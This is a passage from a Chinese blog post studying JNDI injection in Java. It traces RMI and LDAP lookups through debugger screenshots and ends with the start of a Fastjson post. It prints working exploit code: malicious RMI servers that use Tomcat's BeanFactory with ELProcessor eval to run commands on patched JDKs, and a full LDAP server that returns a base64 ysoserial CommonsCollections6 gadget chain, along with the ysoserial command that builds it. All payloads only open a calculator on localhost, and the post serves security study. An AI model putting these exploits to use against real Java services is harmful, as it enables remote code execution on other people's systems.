<p>跟到<code>RegistryContext.rebind()</code>，里面有<code>this.registry.rebind()</code>，传进去的参数中var2被<code>encodeObject()</code>处理了</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250416233311.png" ></p>
<p>里面就把var1强制转换类型成<code>ReferenceWrapper</code></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250416233353.png" ></p>
<p>继续回到客户端，就是有个<code>decodeObject()</code>刚好对应，里面有一个判断把ReferenceWrapper转换会Rederence</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250416233819.png" ></p>
<p>然后重点在后面进入<code>getObjectInstance()</code>一直到后面<code>getObjectFactoryFromReference()</code>，用这个方法调用reference里面的factory</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250416234126.png" ></p>
<p>此时已经可以知道factory叫Calc</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250416234304.png" ></p>
<p>进到里面执行了类加载，用的loadClass，联系到之前类加载的URLClassloader，一直走到newInstance这一步弹出计算机</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250416234858.png" ></p>
<p>所以最后导致代码被利用的是<code>NamingManager</code>这个类，这意味着我们的容器如果是别的格式的也是可以实现利用的</p>
<h4 id="JNDI结合LDAP"><a href="#JNDI结合LDAP" class="headerlink" title="JNDI结合LDAP"></a>JNDI结合LDAP</h4><p>之前通常是在域环境遇到ldap，</p>
<blockquote>
<p><em>LDAP（Lightweight Directory Access Protocol ，轻型目录访问协议）是一种目录服务协议LDAP目录服务是由目录数据库和一套访问协议组成的系统，目录服务是一个特殊的数据库，用来保存描述性的、基于属性的详细信息，能进行查询、浏览和搜索，以树状结构组织数据。LDAP目录服务基于客户端-服务器模型，它的功能用于对一个存在目录数据库的访问。 LDAP目录和RMI注册表的区别在于是前者是目录服务，并允许分配存储对象的属性。</em></p>
</blockquote>
<p>起一个ldap服务</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250417002139.png" ></p>
<p>然后服务端修改代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">initialContext.rebind(<span class="string">&quot;ldap://127.0.0.1:10389/cn=test,dc=example,dc=com&quot;</span>, reference);</span><br></pre></td></tr></table></figure>

<p>再看就已经成功绑定上了</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250417002233.png" ></p>
<p>然后再用客户端直接去lookup就行</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">RemoteObj</span> <span class="variable">remoteObj</span> <span class="operator">=</span> (RemoteObj) initialContext.lookup(<span class="string">&quot;ldap://127.0.0.1:10389/cn=test,dc=example,dc=com&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>成功弹出计算机</p>
<p>也是跟进去，重点在后面<code>LdapCtx.c_lookup()</code>，里面有一个<code>decodeObject()</code>，算是解出ldap里面存的内容</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250417003158.png" ></p>
<p>走完出来就可以获取到要类加载的具体信息</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250417003304.png" ></p>
<p>再走到后面又是<code>getObjectInstance()</code>但是调用的是DirectoryManager类的，流程是差不多的，这个类是漏网之鱼，修复时间比较晚</p>
<h3 id="JNDI攻击高版本绕过"><a href="#JNDI攻击高版本绕过" class="headerlink" title="JNDI攻击高版本绕过"></a>JNDI攻击高版本绕过</h3><p>看一下高版本java修复了什么，这里用8u191</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250417212409.png" ></p>
<p>在<code>loadclass()</code>里面多了一个判断，这时候<code>trustURLCodebase</code>是false，所以进不去循环，没办法完成类加载</p>
<h4 id="BeanFactory绕过"><a href="#BeanFactory绕过" class="headerlink" title="BeanFactory绕过"></a>BeanFactory绕过</h4><p>这里限制了用URLClassLoader，那我们思路改成用本地的类加载，<strong>利用本地的恶意类作为Reference factory</strong></p>
<p>也就是说，在服务端本地找到恶意factory作为Reference factory进行攻击，这个恶意factory必须实现<code>javax.naming.spi.ObjectFactory</code>接口，实现这个接口的<code>getObjectInstance()</code>方法</p>
<p>救赎之道就是<code>org.apache.naming.factory.BeanFactory</code>，他满足条件并且存在tomcat8里面，应用面比较广。</p>
<p>先看一下大佬给出的代码再理解吧</p>
<p>JNDIBypassHighJavaClient</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIBypassHighJavaClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">uri</span> <span class="operator">=</span> <span class="string">&quot;rmi://127.0.0.1:1099/Object&quot;</span>;</span><br><span class="line">        <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        context.lookup(uri);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>JNDIBypassHighJavaServerRebind</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIBypassHighJavaServerRebind</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.setProperty(<span class="string">&quot;java.rmi.server.hostname&quot;</span>, <span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">ResourceRef</span> <span class="variable">resourceRef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>,</span><br><span class="line">                <span class="literal">true</span>, <span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;x=eval&quot;</span>));</span><br><span class="line">        resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;x&quot;</span>,<span class="string">&quot;Runtime.getRuntime().exec(&#x27;open -a calculator&#x27;)&quot;</span> ));</span><br><span class="line"></span><br><span class="line">        initialContext.rebind(<span class="string">&quot;rmi://127.0.0.1:1099/Object&quot;</span>, resourceRef);</span><br><span class="line">        System.out.println(<span class="string">&quot;RMI服务已启动，等待客户端连接...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我实验用了8u202版本，然后也加入了tomcat8依赖，运行之后就弹计算机了</p>
<p>调试看一下，前面的内容都差不多，走到了<code>NamingManager.getObjectInstance()</code></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250419145348.png" ></p>
<p>可以看到现在进入<code>getObjectFactoryFromReference()</code>里面带的reference是“org.apache.naming.factory.BeanFactory”，进到里面的loadclass会进行这个类加载</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250419145644.png" ></p>
<p>然后再判断clas（也就是和我们传的factory有关）是否实现了<code>ObjectFactory</code>接口，接着进入<code>newInstance()</code></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250419145849.png" ></p>
<p>再到<code>getObjectInstance()</code>里面回先判断obj是不是ResourceRef实例，是的话才能继续走下去</p>
<blockquote>
<p><strong>这就是为什么我们在恶意 RMI 服务端中构造 Reference 类实例的时候必须要用 Reference 类的子类 ResourceRef 类来创建实例</strong></p>
</blockquote>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250419150358.png" ></p>
<p>经过一系列操作，loadclass，获取到beanclass是<code>javax.el.ELProcessor</code>，实例化他，然后获取里面<code>forceString</code>的值，也就是我们构造的<code>x=eval</code></p>
<blockquote>
<p>继续往下调试可以看到，查找 <code>forceString</code> 的内容中是否存在”&#x3D;”号，不存在的话就调用属性的默认 setter 方法，存在的话就取键值、其中键是属性名而对应的值是其指定的 setter 方法。如此，<strong>之前设置的 <code>forceString</code> 的值就可以强制将 x 属性的 setter 方法转换为调用我们指定的 eval() 方法了，这是 <code>BeanFactory</code> 类能进行利用的关键点！</strong>之后，就是获取 beanClass 即 <code>javax.el.ELProcessor</code> 类的 eval() 方法并和 x 属性一同缓存到 forced 这个 HashMap 中：</p>
</blockquote>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250419150850.png" ></p>
<p>后面就是多个dowhile语句，遍历获取ResourceRef实例addr属性的值，获取到addrType的值为x时退出当前循环，然后调用<code>getContent()</code>获取我们传进去的恶意表达式</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250419151149.png" ></p>
<p>然后从前面的缓存forced中取出key为x的值即javax.el.ELProcessor类的eval()方法并赋值给method变量，最后带着这些参数走到invoke，实现反射调用执行</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250419151404.png" ></p>
<p>还是好理解的，不能用远程的，那就找到一个本地的去用，但是服务端<code>resourceRef.add()</code>里面写的详细内容，说实话不是理解的很透彻，大概设计el表达式，这块现在还不太懂，可能后面学了再看会清晰很多，这里先留个钩子</p>
<p>这里服务端还有另一个写法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIBypassHighJava</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;[*]Evil RMI Server is Listening on port: 1099&quot;</span>);</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry( <span class="number">1099</span>);</span><br><span class="line">        <span class="type">ResourceRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>,</span><br><span class="line">                <span class="literal">true</span>, <span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;x=eval&quot;</span>));</span><br><span class="line"></span><br><span class="line">        ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;x&quot;</span>, <span class="string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;open&#x27;,&#x27;-a&#x27;,&#x27;Calculator&#x27;]).start()\&quot;)&quot;</span>));</span><br><span class="line">        System.out.println(<span class="string">&quot;[*]Evil command: calc&quot;</span>);</span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(ref);</span><br><span class="line">        registry.bind(<span class="string">&quot;Object&quot;</span>, referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>主要差别是这个</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;x&quot;</span>, <span class="string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;open&#x27;,&#x27;-a&#x27;,&#x27;Calculator&#x27;]).start()\&quot;)&quot;</span>));</span><br></pre></td></tr></table></figure>

<p>差不多也是反射调用命令执行，但是没有外层的eval也是没用，目前个人认为这个没有直接写Runtime方便</p>
<h4 id="利用LDAP返回序列化数据绕过"><a href="#利用LDAP返回序列化数据绕过" class="headerlink" title="利用LDAP返回序列化数据绕过"></a>利用LDAP返回序列化数据绕过</h4><p>LDAP服务端除了返回JNDI Reference这种方法之外，还可以通过返回序列化的对象，JNDI注入依然会对该对象进行反序列化操作，利用反序列化Gadget完成命令执行。</p>
<blockquote>
<p>如果 Java 对象的 javaSerializedData 属性值不为空，则客户端的 <code>obj.decodeObject()</code> 方法就会对这个字段的内容进行反序列化。此时，如果服务端 ClassPath 中存在反序列化咯多功能利用 Gadget 如 CommonsCollections 库，那么就可以结合该 Gadget 实现反序列化漏洞攻击。</p>
</blockquote>
<p>所以写一个ldap服务器，里面加入gadget内容</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPException;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LdapServer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LDAP_BASE</span> <span class="operator">=</span> <span class="string">&quot;dc=example,dc=com&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;http://127.0.0.1:39876/#Evil&quot;</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">39654</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(</span><br><span class="line">                    <span class="string">&quot;listen&quot;</span>,</span><br><span class="line">                    InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>),</span><br><span class="line">                    port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> <span class="title class_">OperationInterceptor</span>(<span class="keyword">new</span> <span class="title class_">URL</span>(url)));</span><br><span class="line">            <span class="type">InMemoryDirectoryServer</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(config);</span><br><span class="line">            System.out.println(<span class="string">&quot;Listening on 0.0.0.0:&quot;</span> + port);</span><br><span class="line">            ds.startListening();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title class_">InMemoryOperationInterceptor</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> URL codebase;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">OperationInterceptor</span> <span class="params">( URL cb )</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * &#123;<span class="doctag">@inheritDoc</span>&#125;</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@see</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">base</span> <span class="operator">=</span> result.getRequest().getBaseDN();</span><br><span class="line">            <span class="type">Entry</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> LDAPException, MalformedURLException &#123;</span><br><span class="line">            <span class="type">URL</span> <span class="variable">turl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="built_in">this</span>.codebase, <span class="built_in">this</span>.codebase.getRef().replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;.class&quot;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="string">&quot; redirecting to &quot;</span> + turl);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;Exploit&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">cbstring</span> <span class="operator">=</span> <span class="built_in">this</span>.codebase.toString();</span><br><span class="line">            <span class="type">int</span> <span class="variable">refPos</span> <span class="operator">=</span> cbstring.indexOf(<span class="string">&#x27;#&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//低版本JDK</span></span><br><span class="line"><span class="comment">/*            e.addAttribute(&quot;javaCodeBase&quot;, cbstring);</span></span><br><span class="line"><span class="comment">            e.addAttribute(&quot;objectClass&quot;, &quot;javaNamingReference&quot;);</span></span><br><span class="line"><span class="comment">            e.addAttribute(&quot;javaFactory&quot;, this.codebase.getRef());*/</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">//高版本JDK</span></span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaSerializedData&quot;</span>, Base64.getDecoder().decode(<span class="string">&quot;rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB+ABsAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAAAnB1cQB+ABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZxAH4A&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;GHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0ABJvcGVuIC1hIGNhbGN1bGF0b3J0AARleGVjdXEAfgAbAAAAAXEAfgAgc3EAfgAPc3IAEWphdmEubGFuZy5JbnRlZ2VyEuKgpPeBhzgCAAFJAAV2YWx1ZXhyABBqYXZhLmxhbmcuTnVtYmVyhqyVHQuU4IsCAAB4cAAAAAFzcgARamF2YS51dGlsLkhhc2hNYXAFB9rBwxZg0QMAAkYACmxvYWRGYWN0b3JJAAl0aHJlc2hvbGR4cD9AAAAAAAAAdwgAAAAQAAAAAHh4eA==&quot;</span>));</span><br><span class="line">          <span class="comment">// java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections6 &#x27;open -a calculator&#x27;|base64 -w 0</span></span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后客户端执行lookup也能弹计算机</p>
<p>这里有一款工具自动化很方便 <a class="link"   href="https://github.com/rebeyond/JNDInjector.git" >https://github.com/rebeyond/JNDInjector.git<i class="fas fa-external-link-alt"></i></a></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250419163733.png" ></p>
<p>看一下代码，前面都是一样的，进入到<code>decodeObject()</code>-&gt;<code>getURLClassLoader()</code></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250419163953.png" ></p>
<p>里面依然有对trustURLCodebase的判断，结果是false</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250419164103.png" ></p>
<p>但是回到decodeObject里面有一个<code>deserializeObject()</code>，里面有<code>readObejct()</code>就是用来反序列化的，而且我们也有了字节码，所以这样也能攻击成功。</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250419165024.png" ></p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>【从文档开始的jndi注入之路-2 jndi+ldap绕过】<a class="link"   href="https://www.bilibili.com/video/BV1JY411F7mA?vd_source=46e5237289ae6c1a3c7bcab6091e42a6" >https://www.bilibili.com/video/BV1JY411F7mA?vd_source=46e5237289ae6c1a3c7bcab6091e42a6<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/" >https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://github.com/bfengj/CTF/blob/main/Web/java/JNDI/%5BJava%E5%AE%89%E5%85%A8%5D%E7%BB%95%E8%BF%87%E9%AB%98%E7%89%88%E6%9C%ACJDK%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.md" >https://github.com/bfengj/CTF/blob/main/Web/java/JNDI/%5BJava%E5%AE%89%E5%85%A8%5D%E7%BB%95%E8%BF%87%E9%AB%98%E7%89%88%E6%9C%ACJDK%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.md<i class="fas fa-external-link-alt"></i></a></p>
<h4 id="碎碎念"><a href="#碎碎念" class="headerlink" title="碎碎念"></a>碎碎念</h4><p>诶其实还有好多别的做法，现在先摸个皮毛，差不多了解这个思想，以后遇到更深的再接触</p>
]]></content>
      <tags>
        <tag>java</tag>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title>Java-Fastjson基础</title>
    <url>/2025/04/19/Java-Fastjson%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h3 id="Fastjson简介"><a href="#Fastjson简介" class="headerlink" title="Fastjson简介"></a>Fastjson简介</h3><p>Fastjson 是一个 Java 库，可以将 Java 对象转换为 JSON 格式，当然它也可以将 JSON 字符串转换为 Java 对象。</p>
<p>Fastjson 可以操作任何 Java 对象，即使是一些预先存在的没有源码的对象。</p>
<p>Fastjson 源码地址：<a class="link"   href="https://github.com/alibaba/fastjson" >https://github.com/alibaba/fastjson<i class="fas fa-external-link-alt"></i></a></p>
